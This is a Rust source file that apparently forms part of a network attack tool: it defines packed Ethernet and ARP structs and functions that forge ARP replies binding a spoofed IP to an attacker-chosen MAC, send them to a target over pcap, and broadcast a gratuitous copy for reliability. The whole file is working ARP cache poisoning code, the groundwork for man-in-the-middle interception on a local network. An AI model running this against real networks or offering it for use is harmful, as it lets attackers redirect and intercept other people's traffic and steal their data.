use crate::utils::{ChecksumExt, open_capture};

#[repr(C, packed)]
#[derive(Clone, Debug, Default)]
pub struct EtherHeader {
    pub dst_mac: [u8; 6],
    pub src_mac: [u8; 6],
    pub ether_type: u16,
}

#[repr(C, packed)]
#[derive(Clone, Debug, Default)]
pub struct ArpPacket {
    pub htype: u16,
    pub ptype: u16,
    pub hlen: u8,
    pub plen: u8,
    pub opcode: u16,
    pub sender_mac: [u8; 6],
    pub sender_ip: [u8; 4],
    pub target_mac: [u8; 6],
    pub target_ip: [u8; 4],
}

fn build_spoof_response(arp_packet: &ArpPacket, eth_header: &EtherHeader) -> [u8; 42] {
    let e_type = eth_header.ether_type.to_be_bytes();
    let htype = arp_packet.htype.to_be_bytes();
    let ptype = arp_packet.ptype.to_be_bytes();
    let opcode = arp_packet.opcode.to_be_bytes();

    [
        // Ethernet
        eth_header.dst_mac[0],
        eth_header.dst_mac[1],
        eth_header.dst_mac[2],
        eth_header.dst_mac[3],
        eth_header.dst_mac[4],
        eth_header.dst_mac[5],
        eth_header.src_mac[0],
        eth_header.src_mac[1],
        eth_header.src_mac[2],
        eth_header.src_mac[3],
        eth_header.src_mac[4],
        eth_header.src_mac[5],
        e_type[0],
        e_type[1],
        // ARP
        htype[0],
        htype[1],
        ptype[0],
        ptype[1],
        arp_packet.hlen,
        arp_packet.plen,
        opcode[0],
        opcode[1],
        arp_packet.sender_mac[0],
        arp_packet.sender_mac[1],
        arp_packet.sender_mac[2],
        arp_packet.sender_mac[3],
        arp_packet.sender_mac[4],
        arp_packet.sender_mac[5],
        arp_packet.sender_ip[0],
        arp_packet.sender_ip[1],
        arp_packet.sender_ip[2],
        arp_packet.sender_ip[3],
        arp_packet.target_mac[0],
        arp_packet.target_mac[1],
        arp_packet.target_mac[2],
        arp_packet.target_mac[3],
        arp_packet.target_mac[4],
        arp_packet.target_mac[5],
        arp_packet.target_ip[0],
        arp_packet.target_ip[1],
        arp_packet.target_ip[2],
        arp_packet.target_ip[3],
    ]
}

pub fn send_arp_poison(
    interface: &str,
    spoofed_ip: [u8; 4],
    spoofed_mac: [u8; 6],
    target_ip: [u8; 4],
    target_mac: [u8; 6],
) -> Result<(), String> {
    let mut cap = open_capture(interface)?;
    cap.setnonblock().map_err(|e| e.to_string())?;

    let eth = EtherHeader {
        dst_mac: target_mac,
        src_mac: spoofed_mac,
        ether_type: 0x0806,
    };

    let arp = ArpPacket {
        htype: 0x0001,
        ptype: 0x0800,
        hlen: 6,
        plen: 4,
        opcode: 0x0002,
        sender_mac: spoofed_mac,
        sender_ip: spoofed_ip,
        target_mac,
        target_ip,
    };

    let packet = build_spoof_response(&arp, &eth);
    cap.sendpacket(packet)
        .map_err(|e| format!("pcap send error: {e}"))?;

    // send gratuitous announcement as broadcast to improve reliability
    let mut broadcast_eth = eth.clone();
    broadcast_eth.dst_mac = [0xff; 6];
    let mut broadcast_arp = arp.clone();
    broadcast_arp.target_mac = [0xff; 6];
    let broadcast_packet = build_spoof_response(&broadcast_arp, &broadcast_eth);
    cap.sendpacket(broadcast_packet)
        .map_err(|e| format!("pcap send error: {e}"))?;

    Ok(())
}

pub trait ArpBuilder {
    fn new_poison(
        spoofed_ip: [u8; 4],
        spoofed_mac: [u8; 6],
        target_ip: [u8; 4],
        target_mac: [u8; 6],
    ) -> (EtherHeader, ArpPacket);
}

impl ArpBuilder for ArpPacket {
    fn new_poison(
        spoofed_ip: [u8; 4],
        spoofed_mac: [u8; 6],
        target_ip: [u8; 4],
        target_mac: [u8; 6],
    ) -> (EtherHeader, ArpPacket) {
        let eth = EtherHeader {
            dst_mac: target_mac,
            src_mac: spoofed_mac,
            ether_type: 0x0806,
        };

        let arp = ArpPacket {
            htype: 0x0001,
            ptype: 0x0800,
            hlen: 6,
            plen: 4,
            opcode: 0x0002,
            sender_mac: spoofed_mac,
            sender_ip: spoofed_ip,
            target_mac,
            target_ip,
        };

        (eth, arp)
    }
}

impl ChecksumExt for ArpPacket {}
